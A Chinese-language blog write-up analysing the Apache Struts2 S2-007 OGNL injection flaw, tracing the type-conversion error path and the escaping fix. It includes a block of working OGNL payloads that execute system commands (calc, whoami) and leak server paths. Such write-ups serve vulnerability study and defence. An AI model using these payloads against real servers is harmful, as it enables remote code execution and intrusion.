---
title: Struts2-007漏洞分析
tags: Struts2
typora-root-url: ../
---

#### 漏洞概要

可参考官方安全公告：https://cwiki.apache.org/confluence/display/WW/S2-007

#### 漏洞分析

S2-007的利用场景比较苛刻，要求对提交的参数配置了验证规则并对提交的参数进行类型转换的时候会造成`OGNL`表达式的执行。

这个漏洞的成因在于，在Struts2中，关于表单我们可以设置每个字段的规则验证，如果类型转换错误时，就会进行错误的字符串拼接，通过闭合引号导致`OGNL`的语法解析。

<!--more-->

简易POC

```
'+(#application)+'
```

在 Struts2 中，可以将 HTTP 请求数据注入到实际业务 Action 的属性中。而这些属性可以是任意类型的数据，通过 HTTP 只能获取到 String 类型数据，所以这里存在类型转换。我们可以通过 xml 文件，来定义转换规则。例如，我这里定义了一个 `UserAction` 类，其有一个 `Integer` 类型的 `age` 属性，这里我们让其数值范围在`1-150` 。

![image-20201228145655095](/img/Struts2-007%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201228145655095.png)

![image-20201225155539404](/img/Struts2-007%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201225155539404.png)

如果此时我们将 `age` 属性值设置成一个字符串，那么就会引发类型转换错误。Struts2 会将用户输入的数据经过处理再次返回给用户。

![image-20201225155827873](/img/Struts2-007%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201225155827873.png)

而在这个处理的过程中，就存在 `OGNL` 表达式注入，我们先在` ConversionErrorInterceptor:intercept() `方法中打上断点(`ConversionErrorInterceptor` 类是专门用来处理类型转换失败的拦截器)，当类型出现错误的时候，就会进入这里

![image-20201225160842454](/img/Struts2-007%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201225160842454.png)

![image-20201225160414486](/img/Struts2-007%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201225160414486.png)

当发生类型转换错误时，程序会将用户输入的值存入 `fakie` 变量。在存入之前，会先将值用 `getOverrideExpr `方法处理，我们跟进该方法。

![image-20201225161637883](/img/Struts2-007%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201225161637883.png)

在 `getOverrideExpr` 方法中，会在用户输入的值两边拼接上单引号，然后再将值存入刚刚的 `fakie` 变量。这里把我们的payload用单引号阔起来了，这也就解释了为什么我们的payload是形如 `' + (*) + '`的形式，就是为了逃逸这个单引号。

![image-20201225161954632](/img/Struts2-007%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201225161954632.png)

接着程序会把` fakie` 变量通过`setExprOverrides`将其放入`OgnlValueStack.overrides`中

![image-20201225162709287](/img/Struts2-007%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201225162709287.png)

![image-20201225164705641](/img/Struts2-007%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201225164705641.png)

然后在解析到 Struts2的 `/>`标签时，会将用户输入值经过` OGNL` 执行并返回。如果先前 `OgnlValueStack.overrides `存储过相关字段，则会先从` OgnlValueStack.overrides` 中取出相关值，然后再通过` OGNL `执行。

![image-20201225172127453](/img/Struts2-007%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201225172127453.png)

![image-20201225172048324](/img/Struts2-007%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201225172048324.png)

![image-20201225172537185](/img/Struts2-007%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201225172537185.png)

```
# 弹计算器
'+(#context["xwork.MethodAccessor.denyMethodExecution"]=false,@java.lang.Runtime@getRuntime().exec("calc"))+'

'+(#_memberAccess["allowStaticMethodAccess"]=true,#context["xwork.MethodAccessor.denyMethodExecution"]=false,@java.lang.Runtime@getRuntime().exec("calc"))+'

# 获取绝对路径
'+(#context["xwork.MethodAccessor.denyMethodExecution"]=false,#req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter().write(#req.getRealPath('/')))+'

'+(#_memberAccess["allowStaticMethodAccess"]=true,#context["xwork.MethodAccessor.denyMethodExecution"]=false,#req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter().write(#req.getRealPath('/')))+'

# 执行系统命令并回显
'+(#context["xwork.MethodAccessor.denyMethodExecution"]=false,#response=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter().write(new java.util.Scanner(@java.lang.Runtime@getRuntime().exec('whoami').getInputStream()).useDelimiter("\\Z").next()))+'

'+(#_memberAccess["allowStaticMethodAccess"]=true,#context["xwork.MethodAccessor.denyMethodExecution"]=false,#response=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter().write(new java.util.Scanner(@java.lang.Runtime@getRuntime().exec('whoami').getInputStream()).useDelimiter("\\Z").next()))+'
```



![image-20201225172935494](/img/Struts2-007%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201225172935494.png)

#### 修复

使用 `org.apache.commons.lang.StringEscapeUtils.escapeJava()`来做了一下escape，防止再从引号里面逃逸出来。

![image-20201225173722361](/img/Struts2-007%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201225173722361.png)

#### 参考

https://xz.aliyun.com/t/7971

https://cwiki.apache.org/confluence/display/WW/S2-007